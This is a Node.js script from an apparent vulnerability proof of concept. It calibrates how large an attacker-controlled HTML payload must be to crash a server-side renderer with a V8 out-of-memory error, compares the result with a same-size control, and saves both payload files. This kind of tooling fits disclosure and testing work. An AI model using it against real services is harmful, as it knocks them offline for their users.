import { mkdir, writeFile } from 'node:fs/promises';
import { runProfile } from './e2e-lib.mjs';
import { payloadMeta } from './payload-lib.mjs';

const heapMb = Number(process.env.HEAP_MB ?? 256);
const minK = Number(process.env.K_MIN ?? 350);
const maxK = Number(process.env.K_MAX ?? 650);
const step = Number(process.env.K_STEP ?? 25);

for (const [name, value] of [['HEAP_MB', heapMb], ['K_MIN', minK], ['K_MAX', maxK], ['K_STEP', step]]) {
  if (!Number.isInteger(value) || value <= 0) throw new Error(`invalid ${name}=${value}`);
}
if (minK > maxK) throw new Error('K_MIN must be <= K_MAX');

console.log(`runtime: node=${process.version} v8=${process.versions.v8}`);
console.log(`calibration: heap=${heapMb} MiB range=${minK}..${maxK} step=${step}`);
console.log('Each candidate is rendered in a fresh worker. A successful HTTP 200 is treated immediately as NO OOM.');

let firstOom = null;
let lastSafe = null;
let port = 4200;
for (let k = minK; k <= maxK; k += step) {
  const meta = payloadMeta(k, 'candidate');
  process.stdout.write(`candidate k=${k} bytes=${meta.bytes} ... `);
  const r = await runProfile({ profile: 'candidate', k, port: port++, heapMb, quiet: true, expect: 'observe' });
  if (r.oom) {
    console.log('OOM');
    firstOom = k;
    break;
  }
  if (r.responseStatus === 200 && r.alive) {
    console.log('HTTP 200 / alive');
    lastSafe = k;
    continue;
  }
  console.log('INCONCLUSIVE');
  console.log(JSON.stringify({ responseStatus: r.responseStatus, requestError: r.requestError, exited: r.exited, fatal: r.fatal }, null, 2));
  process.exit(3);
}

if (firstOom === null) {
  console.error(`\nNo candidate OOM found through k=${maxK}. Increase K_MAX cautiously, e.g. in PowerShell:`);
  console.error(`$env:K_MAX='800'; npm run poc:calibrate:256`);
  process.exit(2);
}

// Refine the interval so the retained value is not just an arbitrary coarse step.
const fineStart = Math.max(minK, (lastSafe ?? (firstOom - step)) + 1);
let retainedK = firstOom;
if (fineStart < firstOom) {
  console.log(`\nrefining first OOM in ${fineStart}..${firstOom} (step 5)`);
  for (let k = fineStart; k <= firstOom; k += 5) {
    const meta = payloadMeta(k, 'candidate');
    process.stdout.write(`candidate k=${k} bytes=${meta.bytes} ... `);
    const r = await runProfile({ profile: 'candidate', k, port: port++, heapMb, quiet: true, expect: 'observe' });
    if (r.oom) {
      console.log('OOM');
      retainedK = k;
      break;
    }
    if (r.responseStatus === 200 && r.alive) {
      console.log('HTTP 200 / alive');
      continue;
    }
    console.log('INCONCLUSIVE');
    process.exit(3);
  }
}

const retained = payloadMeta(retainedK, 'candidate');
console.log(`\n=== MATCHED CONTROL at retained k=${retainedK}, bytes=${retained.bytes} ===`);
const control = await runProfile({ profile: 'control', k: retainedK, port: port++, heapMb, quiet: false, expect: 'observe' });
if (!(control.responseStatus === 200 && control.alive && !control.fatal)) {
  console.error('Control did not remain healthy at the candidate OOM threshold. This runtime does not provide a clean differential at the tested granularity.');
  console.error(JSON.stringify({ responseStatus: control.responseStatus, requestError: control.requestError, exited: control.exited, fatal: control.fatal }, null, 2));
  process.exit(4);
}

await mkdir('payloads', { recursive: true });
const cand = payloadMeta(retainedK, 'candidate');
const ctrl = payloadMeta(retainedK, 'control');
await writeFile(`payloads/candidate-k${retainedK}-${cand.bytes}b.html`, cand.value, 'utf8');
await writeFile(`payloads/control-k${retainedK}-${ctrl.bytes}b.html`, ctrl.value, 'utf8');
await writeFile('payloads/candidate-current.html', cand.value, 'utf8');
await writeFile('payloads/control-current.html', ctrl.value, 'utf8');

console.log('\nCALIBRATION PASS');
console.log(`retained k=${retainedK}`);
console.log(`attacker-controlled HTML bytes=${cand.bytes}`);
console.log(`candidate sha256=${cand.sha256}`);
console.log(`control   sha256=${ctrl.sha256}`);
console.log('equal-byte control: HTTP 200 + health 200');
console.log('candidate: V8 fatal OOM / worker exit');
console.log('\nRe-run exactly:');
if (process.platform === 'win32') {
  console.log(`PowerShell: $env:K='${retainedK}'; npm run poc:e2e:256`);
} else {
  console.log(`K=${retainedK} npm run poc:e2e:256`);
}
